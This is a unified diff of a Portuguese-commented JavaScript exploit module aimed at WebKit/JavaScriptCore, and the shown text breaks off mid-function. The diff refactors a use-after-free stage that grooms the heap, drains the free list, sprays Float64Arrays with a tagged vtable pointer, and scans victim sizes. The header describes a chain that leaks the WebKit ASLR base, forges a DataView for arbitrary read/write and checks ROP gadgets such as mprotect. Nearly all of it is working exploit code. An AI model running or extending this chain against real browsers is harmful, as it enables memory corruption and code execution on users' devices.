@@ -1,12 +1,12 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v08 - Scanner de VICTIM_SIZE_BYTES)
+// js/script3/testArrayBufferVictimCrash.mjs (v08 - Scanner de Tamanhos de Vítima)
 // =======================================================================================
 // ESTA VERSÃO INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
 // 1. Validar primitivas básicas (OOB local).
 // 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
+//    - Scanner de tamanhos de vítima (VICTIM_SIZE_BYTES) para encontrar o ideal.
 //    - Estratégia de Spray de objetos do MESMO TIPO da vítima (Float64Array para Float64Array).
 //    - Drenagem ativa da free list.
-//    - Múltiplas tentativas de UAF.
-//    - NOVO: Scanner para testar faixas de VICTIM_SIZE_BYTES automaticamente.
+//    - Múltiplas tentativas de UAF por tamanho.
 // 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
 // 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
 // 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
@@ -29,26 +29,21 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v08 - Scanner de VICTIM_SIZE_BYTES";
+export const FNAME_MODULE = "v08 - Scanner de Tamanhos de Vítima";
 
-// Pausas para estabilidade
+// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
 const LOCAL_SHORT_PAUSE = 100;
 const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
 const LOCAL_SHORT_SHORT_PAUSE = 50;
 
-let global_spray_objects = [];
-let hold_objects = [];
+let global_spray_objects = []; // Usado para o spray inicial de heap grooming de alto volume
+let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente (vítimas, sprays UAF, etc.)
 
+// Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
 let _fake_data_view = null;
 
-// --- Configurações do Scanner de VICTIM_SIZE_BYTES ---
-// É crucial que min e max sejam múltiplos de 8 (tamanho de um double)
-// e preferencialmente múltiplos de 16 (alinhamento do bmalloc).
-const SCANNER_MIN_VICTIM_SIZE_BYTES = 0x60; // Começa com 96 bytes (12 doubles)
-const SCANNER_MAX_VICTIM_SIZE_BYTES = 0xA0; // Vai até 160 bytes (20 doubles)
-const SCANNER_VICTIM_SIZE_INCREMENT = 0x10; // Incrementa em 16 bytes a cada teste.
 
 // Funções Auxiliares Comuns (dumpMemory)
 async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
@@ -259,120 +254,150 @@ async function triggerGC(logFn, pauseFn) {
 }
 
 /**
- * Cria um objeto vítima e tenta um spray UAF mais robusto com heap grooming.
+ * Tenta acionar o UAF/Type Confusion para um dado tamanho de vítima.
+ * @param {number} victimSizeBytes O tamanho em bytes dos dados do Float64Array vítima/spray.
  * @param {Function} logFn Função de log.
  * @param {Function} pauseFn Função de pausa.
  * @param {object} JSC_OFFSETS_PARAM Offsets JSC.
- * @param {number} victimSizeBytes O tamanho em bytes para a parte de dados da vítima (e spray).
- * @returns {Float64Array} A referência pendurada (dangling reference) que será o alvo da confusão de tipos.
+ * @returns {Promise<boolean>} True se o UAF e o vazamento de ponteiro foram bem-sucedidos.
  */
-async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, victimSizeBytes) {
+async function attemptUafLeakForSize(victimSizeBytes, logFn, pauseFn, JSC_OFFSETS_PARAM) {
+    const FNAME = "attemptUafLeakForSize";
+    logFn(`[${FNAME}] Tentando UAF para VICTIM_SIZE_BYTES = ${toHex(victimSizeBytes)} (${victimSizeBytes} bytes)...`, "subtest", FNAME);
+
     let dangling_ref_local = null;
     const SPRAY_COUNT_UAF_OPT = 2000;
-    const SPRAY_OBJECT_DATA_LENGTH = victimSizeBytes / 8; // Número de doubles para Float64Array
+    const SPRAY_OBJECT_DATA_LENGTH = victimSizeBytes / 8; // Converte bytes para número de doubles
 
-    // Validação básica do tamanho
-    if (victimSizeBytes % 8 !== 0 || victimSizeBytes <= 0) {
-        logFn(`[UAF] ERRO: victimSizeBytes (${victimSizeBytes}) deve ser um múltiplo de 8 e positivo.`, "critical", "sprayAndCreateDanglingPointer");
-        throw new Error("Invalid victimSizeBytes.");
+    // Validação básica do tamanho para evitar Float64Array inválido (mínimo 8 bytes = 1 double)
+    if (victimSizeBytes === 0 || victimSizeBytes % 8 !== 0) {
+        logFn(`[${FNAME}] ERRO: VICTIM_SIZE_BYTES (${victimSizeBytes}) deve ser um múltiplo de 8 e maior que 0. Pulando.`, "error", FNAME);
+        return false;
     }
 
-    logFn(`[UAF] Iniciando spray e criação de ponteiro pendurado (TESTANDO VICTIM_SIZE_BYTES=${toHex(victimSizeBytes)})...`, "info");
+    try {
+        // FASE 1: Heap Grooming (Preparação do Heap)
+        const HEAP_GROOMING_SPRAY_COUNT = 15000;
+        const grooming_spray_before_victim = [];
+        // NOTA: O spray global já foi feito na função principal e não é limpo aqui
+        // para manter uma base de heap consistente entre as tentativas de tamanho.
 
-    // FASE 1: Heap Grooming (Preparação do Heap)
-    const HEAP_GROOMING_SPRAY_COUNT = 15000;
-    const grooming_spray_before_victim = [];
-    logFn(`[UAF] FASE 1: Heap Grooming com ${HEAP_GROOMING_SPRAY_COUNT} objetos de tamanhos variados para preparar o heap...`, "subtest");
-    for (let i = 0; i < HEAP_GROOMING_SPRAY_COUNT; i++) {
-        const size_variant = (i % 16) * 0x10 + 0x40; // Garante múltiplos de 16
-        grooming_spray_before_victim.push(new ArrayBuffer(size_variant));
-    }
-    hold_objects.push(grooming_spray_before_victim);
-    await pauseFn(LOCAL_SHORT_PAUSE);
-
-    // PASSO 2: Criar o objeto vítima (Float64Array)
-    let victim_object_arr = new Float64Array(SPRAY_OBJECT_DATA_LENGTH);
-    victim_object_arr[0] = 1.000000000000123;
-    victim_object_arr[1] = 2.0;
-
-    hold_objects.push(victim_object_arr);
-    dangling_ref_local = victim_object_arr;
-
-    // Forçar otimizações (acessando a vítima repetidamente)
-    for (let i = 0; i < 10000; i++) {
-        victim_object_arr[0] += 0.000000000000001;
-    }
-
-    logFn(`[UAF] Objeto vítima (Float64Array, data len=${victimSizeBytes} bytes) criado e referência pendurada simulada.`, "info");
-    logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref_local).toString(true)}`, "info");
-    logFn(`[UAF] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref_local[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref_local[0]), 64)})`, "info");
-
-    // PASSO 3: Forçar Coleta de Lixo para liberar a memória do 'victim_object_arr'
-    logFn("--- FASE 2: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
-    const ref_index = hold_objects.indexOf(victim_object_arr);
-    if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
-    victim_object_arr = null;
-    await triggerGC(logFn, pauseFn);
-    logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info");
-    await pauseFn(LOCAL_SHORT_PAUSE);
-
-    // Liberar o grooming spray inicial.
-    grooming_spray_before_victim.length = 0;
-    const groom_in_hold_index = hold_objects.indexOf(grooming_spray_before_victim);
-    if (groom_in_hold_index > -1) { hold_objects.splice(groom_in_hold_index, 1); }
-    await triggerGC(logFn, pauseFn);
-    logFn("    Grooming spray inicial liberado e GC forçado novamente.", "info");
-    await pauseFn(LOCAL_SHORT_SHORT_PAUSE);
-
-    // Drenagem Ativa da Free List (Hypothesis)
-    const DRAIN_COUNT = 50;
-    const DRAIN_SPRAY_PER_ITERATION = 50;
-    logFn(`[UAF] FASE 2.5: Drenagem Ativa da Free List (${DRAIN_COUNT} iterações, ${DRAIN_SPRAY_PER_ITERATION} objetos/iteração)...`, "subtest");
-    for (let d = 0; d < DRAIN_COUNT; d++) {
-        const drain_objects = [];
-        for (let i = 0; i < DRAIN_SPRAY_PER_ITERATION; i++) {
-            drain_objects.push(new Float64Array(SPRAY_OBJECT_DATA_LENGTH));
+        logFn(`[${FNAME}] FASE 1: Heap Grooming com ${HEAP_GROOMING_SPRAY_COUNT} objetos de tamanhos variados para preparar o heap...`, "info");
+        for (let i = 0; i < HEAP_GROOMING_SPRAY_COUNT; i++) {
+            const size_variant = (i % 16) * 0x10 + 0x40;
+            grooming_spray_before_victim.push(new ArrayBuffer(size_variant));
         }
-        if (d % 10 === 0) {
-             await triggerGC(logFn, pauseFn);
+        hold_objects.push(grooming_spray_before_victim);
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // PASSO 2: Criar o objeto vítima (Float64Array)
+        let victim_object_arr = new Float64Array(SPRAY_OBJECT_DATA_LENGTH);
+        victim_object_arr[0] = 1.000000000000123;
+        victim_object_arr[1] = 2.0;
+
+        hold_objects.push(victim_object_arr);
+        dangling_ref_local = victim_object_arr;
+
+        for (let i = 0; i < 10000; i++) {
+            victim_object_arr[0] += 0.000000000000001;
         }
-        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
-    }
-    await triggerGC(logFn, pauseFn);
-    logFn("    Drenagem ativa da Free List concluída.", "info");
-    await pauseFn(LOCAL_SHORT_PAUSE);
 
+        logFn(`[${FNAME}] Objeto vítima (Float64Array, tamanho ${victimSizeBytes} bytes) criado.`, "info");
 
-    // PASSO 4: Pulverizar sobre a memória liberada com Float64Array contendo o ponteiro desejado.
-    logFn("--- FASE 3: Pulverizando Float64Array com ponteiros sobre a memória liberada (MESMO TIPO!) ---", "subtest");
-    const spray_arrays = [];
+        // PASSO 3: Forçar Coleta de Lixo para liberar a memória do 'victim_object_arr'
+        logFn(`[${FNAME}] FASE 2: Forçando Coleta de Lixo para liberar a memória da vítima...`, "info");
+        const ref_index = hold_objects.indexOf(victim_object_arr);
+        if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
+        victim_object_arr = null;
+        await triggerGC(logFn, pauseFn);
+        logFn(`[${FNAME}] Memória da vítima liberada.`, "info");
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
-    const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000);
-    const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+        // Liberar o grooming spray inicial.
+        grooming_spray_before_victim.length = 0;
+        const groom_in_hold_index = hold_objects.indexOf(grooming_spray_before_victim);
+        if (groom_in_hold_index > -1) { hold_objects.splice(groom_in_hold_index, 1); }
+        await triggerGC(logFn, pauseFn);
+        logFn(`[${FNAME}] Grooming spray liberado e GC forçado.`, "info");
+        await pauseFn(LOCAL_SHORT_SHORT_PAUSE);
 
-    let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
-
-    const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000;
-    const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_EXPECTED;
-    TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
-
-
-    const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);
-    logFn(`[UAF] Valor Double do VTable da Structure para pulverização (assumindo tag ${toHex(OBJECT_PTR_TAG_HIGH_EXPECTED)} e base): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");
-
-    for (let i = 0; i < SPRAY_COUNT_UAF_OPT; i++) {
-        const spray_obj = new Float64Array(SPRAY_OBJECT_DATA_LENGTH);
-        spray_obj[0] = spray_value_double_to_leak_ptr;
-        for (let j = 1; j < spray_obj.length; j++) {
-            spray_obj[j] = _int64ToDouble_direct(new AdvancedInt64(0xAA + j, 0xBB + j));
+        // Drenagem Ativa da Free List (Hypothesis)
+        const DRAIN_COUNT = 50;
+        const DRAIN_SPRAY_PER_ITERATION = 50;
+        logFn(`[${FNAME}] FASE 2.5: Drenagem Ativa da Free List...`, "info");
+        for (let d = 0; d < DRAIN_COUNT; d++) {
+            const drain_objects = [];
+            for (let i = 0; i < DRAIN_SPRAY_PER_ITERATION; i++) {
+                drain_objects.push(new Float64Array(SPRAY_OBJECT_DATA_LENGTH));
+            }
+            if (d % 10 === 0) { await triggerGC(logFn, pauseFn); }
+            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
         }
-        spray_arrays.push(spray_obj);
-    }
-    hold_objects.push(spray_arrays);
-    logFn(`    Pulverização de ${spray_arrays.length} Float64Array concluída sobre a memória da vítima.`, "info");
-    await pauseFn(LOCAL_SHORT_PAUSE);
+        await triggerGC(logFn, pauseFn);
+        logFn(`[${FNAME}] Drenagem ativa concluída.`, "info");
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
-    return dangling_ref_local;
+
+        // PASSO 4: Pulverizar sobre a memória liberada com Float64Array contendo o ponteiro desejado.
+        logFn(`[${FNAME}] FASE 3: Pulverizando Float64Array (tamanho ${victimSizeBytes} bytes) sobre a memória liberada...`, "info");
+        const spray_arrays = [];
+
+        const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000);
+        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+        let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
+        const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000;
+        const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_EXPECTED;
+        TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
+        const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);
+
+        for (let i = 0; i < SPRAY_COUNT_UAF_OPT; i++) {
+            const spray_obj = new Float64Array(SPRAY_OBJECT_DATA_LENGTH);
+            spray_obj[0] = spray_value_double_to_leak_ptr;
+            for (let j = 1; j < spray_obj.length; j++) {
+                spray_obj[j] = _int64ToDouble_direct(new AdvancedInt64(0xAA + j, 0xBB + j));
+            }
+            spray_arrays.push(spray_obj);
+        }
+        hold_objects.push(spray_arrays);
+        logFn(`[${FNAME}] Pulverização concluída.`, "info");
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // Tentativa de leitura para verificar o vazamento
+        let leaked_jsvalue_from_uaf_double = 0;
+        let uaf_leak_successful = false;
+        const read_attempts = 10;
+        for(let i = 0; i < read_attempts; i++) {
+            leaked_jsvalue_from_uaf_double = dangling_ref_local[0];
+            const leaked_int64_debug = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
+            const isTaggedPointer = (leaked_int64_debug.high() & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH_EXPECTED & 0xFFFF0000);
+
+            if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0 && isTaggedPointer) {
+                 logFn(`[${FNAME}] SUCESSO na leitura! Ponteiro lido: ${toHex(leaked_int64_debug, 64)}.`, "leak");
+                 uaf_leak_successful = true;
+                 break;
+            }
+            logFn(`[${FNAME}] Valor lido inesperado em dangling_ref[0]: ${toHex(leaked_int64_debug, 64)}. Não é um ponteiro taggeado esperado. (Tentativa ${i+1}/${read_attempts})`, "warn");
+            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+        }
+
+        if (uaf_leak_successful) {
+            logFn(`[${FNAME}] SUCESSO CRÍTICO: Confusão de Tipos via UAF OCORREU para VICTIM_SIZE_BYTES=${toHex(victimSizeBytes)}!`, "vuln");
+            // Se o vazamento for bem-sucedido, o caller (executeTypedArrayVictimAddrofAndWebKitLeak_R43)
+            // se encarregará de usar o leaked_jsvalue_from_uaf_double para calcular a base ASLR e prosseguir.
+            return { success: true, leaked_double: leaked_jsvalue_from_uaf_double };
+        } else {
+            logFn(`[${FNAME}] FALHA: Ponteiro vazado do UAF é inválido (double) ou não taggeado para VICTIM_SIZE_BYTES=${toHex(victimSizeBytes)}.`, "error");
+            return { success: false, leaked_double: NaN };
+        }
+
+    } catch (e) {
+        logFn(`[${FNAME}] ERRO CRÍTICO no UAF para VICTIM_SIZE_BYTES=${toHex(victimSizeBytes)}: ${e.message}\n${e.stack || ''}`, "critical");
+        return { success: false, leaked_double: NaN };
+    } finally {
+        // Limpeza dos objetos desta tentativa para não interferir na próxima iteração do scanner
+        hold_objects = [];
+        await triggerGC(logFn, pauseFn); // Força GC para limpar todos os objetos temporários.
+    }
 }
 
 
@@ -385,161 +410,141 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     const startTime = performance.now();
     let webkit_base_address = null;
     let found_m_mode = null;
-    const UAF_ATTEMPTS = 5;
 
-    // --- LOOP DO SCANNER DE TAMANHO DE VÍTIMA ---
-    for (let currentVictimSizeBytes = SCANNER_MIN_VICTIM_SIZE_BYTES;
-         currentVictimSizeBytes <= SCANNER_MAX_VICTIM_SIZE_BYTES;
-         currentVictimSizeBytes += SCANNER_VICTIM_SIZE_INCREMENT) {
+    // Faixa de tamanhos para escanear (em bytes, múltiplos de 8 para Float64Array)
+    const VICTIM_SIZE_RANGE_START = 0x10;   // Começa em 16 bytes (2 doubles)
+    const VICTIM_SIZE_RANGE_END = 0x100;    // Vai até 256 bytes (32 doubles)
+    const VICTIM_SIZE_INCREMENT = 0x08;     // Incrementa de 8 em 8 bytes
 
-        logFn(`\n--- SCANNER: Iniciando teste com VICTIM_SIZE_BYTES = ${toHex(currentVictimSizeBytes)} ---`, "test", FNAME_CURRENT_TEST_BASE);
-        let current_uaf_attempt_success = false; // Flag para cada tentativa UAF dentro do scanner loop
+    let best_victim_size_found = -1;
+    let best_leaked_double = NaN;
 
-        try {
-            // Limpeza inicial e validação de primitivas OOB e addrof/fakeobj
-            logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
-            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
+    try {
+        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
+        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
-            logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
-            const arbTestSuccess = await selfTestOOBReadWrite(logFn);
-            if (!arbTestSuccess) {
-                logFn("Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando scanner.", "critical");
-                throw new Error("ARB R/W local falhou."); // Sai do scanner loop
-            }
-            logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso.", "good");
-            await pauseFn(LOCAL_MEDIUM_PAUSE);
-
-            logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
-            const INITIAL_SPRAY_COUNT = 250000;
-            logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap...`, "info");
-            // Apenas preenche global_spray_objects na primeira iteração do scanner, para evitar exaustão de memória
-            if (currentVictimSizeBytes === SCANNER_MIN_VICTIM_SIZE_BYTES) {
-                 for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
-                     const dataSize = 50 + (i % 50) * 16;
-                     global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
-                 }
-                 logFn(`Spray inicial de ${global_spray_objects.length} objetos concluído.`, "info");
-            } else {
-                 logFn(`Reutilizando spray inicial de ${global_spray_objects.length} objetos.`, "info");
-            }
-            logFn("Heap estabilizado inicialmente.", "good");
-            await pauseFn(LOCAL_SHORT_PAUSE);
-
-            logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
-            await triggerOOB_primitive({ force_reinit: true });
-            const oob_data_view = getOOBDataView();
-            if (!oob_data_view) {
-                logFn("Falha crítica ao obter primitiva OOB. Abortando scanner.", "critical");
-                throw new Error("OOB primitive acquisition failed.");
-            }
-            logFn(`Ambiente OOB configurado com DataView.`, "good");
-            initCoreAddrofFakeobjPrimitives();
-            logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");
+        logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
+        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
+        if (!arbTestSuccess) {
+            const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
-            // --- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR (Múltiplas Tentativas) ---
-            logFn("--- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR (Múltiplas Tentativas) ---", "subtest");
+        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
+        const sprayStartTime = performance.now();
+        const INITIAL_SPRAY_COUNT = 250000;
+        logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
+        for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
+            const dataSize = 50 + (i % 50) * 16;
+            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
+        }
+        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
+        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
-            let leaked_jsvalue_from_uaf_double = 0;
-            let current_dangling_ref = null;
+        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
+        const oobSetupStartTime = performance.now();
+        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
+        await triggerOOB_primitive({ force_reinit: true });
 
-            for (let attempt = 1; attempt <= UAF_ATTEMPTS; attempt++) {
-                logFn(`[UAF LEAK] Tentativa ${attempt}/${UAF_ATTEMPTS} para vazamento de ASLR via UAF/TC. (Tamanho: ${toHex(currentVictimSizeBytes)})`, "subtest");
+        const oob_data_view = getOOBDataView();
+        if (!oob_data_view) {
+            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
+        initCoreAddrofFakeobjPrimitives();
+        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");
+
+
+        // --- FASE 2.5: Escaneamento de Tamanhos para UAF/Type Confusion e Vazamento de ASLR ---
+        logFn("--- FASE 2.5: Iniciando SCANNER DE TAMANHOS para UAF/Type Confusion e Vazamento de ASLR ---", "test");
+        logFn(`Testando VICTIM_SIZE_BYTES de ${toHex(VICTIM_SIZE_RANGE_START)} a ${toHex(VICTIM_SIZE_RANGE_END)} em incrementos de ${toHex(VICTIM_SIZE_INCREMENT)}.`, "info");
+
+        for (let size = VICTIM_SIZE_RANGE_START; size <= VICTIM_SIZE_RANGE_END; size += VICTIM_SIZE_INCREMENT) {
+            logFn(`\n[SCANNER] Iniciando tentativa para VICTIM_SIZE_BYTES = ${toHex(size)}...`, "subtest", "SCANNER");
+            const UAF_ATTEMPTS_PER_SIZE = 3; // Reduzir o número de tentativas por tamanho para evitar travamentos
+            let current_size_uaf_success = false;
+
+            for (let attempt = 1; attempt <= UAF_ATTEMPTS_PER_SIZE; attempt++) {
+                logFn(`[SCANNER] Tentativa UAF #${attempt}/${UAF_ATTEMPTS_PER_SIZE} para tamanho ${toHex(size)}.`, "info", "SCANNER");
+                
+                // Limpa hold_objects e força GC para cada tentativa de UAF por tamanho.
                 hold_objects = [];
                 await triggerGC(logFn, pauseFn);
-                logFn(`    hold_objects limpos antes da Tentativa UAF #${attempt}.`, "info");
+                logFn(`    hold_objects limpos antes da Tentativa UAF #${attempt} para tamanho ${toHex(size)}.`, "info");
                 await pauseFn(LOCAL_SHORT_PAUSE);
 
-                // Passa currentVictimSizeBytes para a função de spray
-                current_dangling_ref = await sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, currentVictimSizeBytes);
+                const uaf_result = await attemptUafLeakForSize(size, logFn, pauseFn, JSC_OFFSETS_PARAM);
 
-                if (!(current_dangling_ref instanceof Float64Array) || current_dangling_ref.length === 0) {
-                     logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tentativa ${attempt} falhou.`, "critical");
-                     if (attempt === UAF_ATTEMPTS) break; // Sai do loop de tentativas para testar o próximo tamanho
-                     continue;
-                }
-
-                let read_attempts = 10;
-                for(let i = 0; i < read_attempts; i++) {
-                    leaked_jsvalue_from_uaf_double = current_dangling_ref[0];
-                    const leaked_int64_debug = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
-
-                    const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000;
-                    const isTaggedPointer = (leaked_int64_debug.high() & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH_EXPECTED & 0xFFFF0000);
-
-                    if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0 && isTaggedPointer) {
-                         logFn(`[UAF LEAK] Ponteiro Double lido da referência pendurada [0] (Tentativa ${i+1}/${read_attempts}, UAF Attempt ${attempt}, Tamanho: ${toHex(currentVictimSizeBytes)}): ${toHex(leaked_int64_debug, 64)}`, "leak");
-                         current_uaf_attempt_success = true; // SUCESSO NESTA TENTATIVA UAF
-                         break;
-                    }
-                    logFn(`[UAF LEAK] Valor lido inesperado em dangling_ref[0]: ${toHex(leaked_int64_debug, 64)}. Não é um ponteiro taggeado esperado. (Tentativa ${i+1}/${read_attempts}, Tamanho: ${toHex(currentVictimSizeBytes)})`, "warn");
-                    await pauseFn(LOCAL_VERY_SHORT_PAUSE);
-                }
-
-                if (current_uaf_attempt_success) {
-                    logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR LIDO! ++++++++++++", "vuln");
-
-                    let untagged_uaf_addr = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
-                    const original_high = untagged_uaf_addr.high();
-                    const untagged_high = original_high & 0x0000FFFF;
-
-                    untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
-                    logFn(`[UAF LEAK] Ponteiro vazado após untagging (presumindo tag 0x402a): ${untagged_uaf_addr.toString(true)}`, "leak");
-
-                    const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
-                    webkit_base_address = untagged_uaf_addr.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
-
-                    if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
-                        logFn(`[UAF LEAK] Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. (Tamanho: ${toHex(currentVictimSizeBytes)})`, "critical");
-                        current_uaf_attempt_success = false; // Falhou na validação da base, então esta tentativa não conta como sucesso total
-                        if (attempt === UAF_ATTEMPTS) break; // Sai do loop de tentativas para testar o próximo tamanho
-                        continue;
-                    }
-                    logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA UAF/TC: ${webkit_base_address.toString(true)} (Tamanho: ${toHex(currentVictimSizeBytes)})`, "good");
-
-                    const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
-                    const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
-                    logFn(`[UAF LEAK] Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
-                    const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);
-
-                    if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
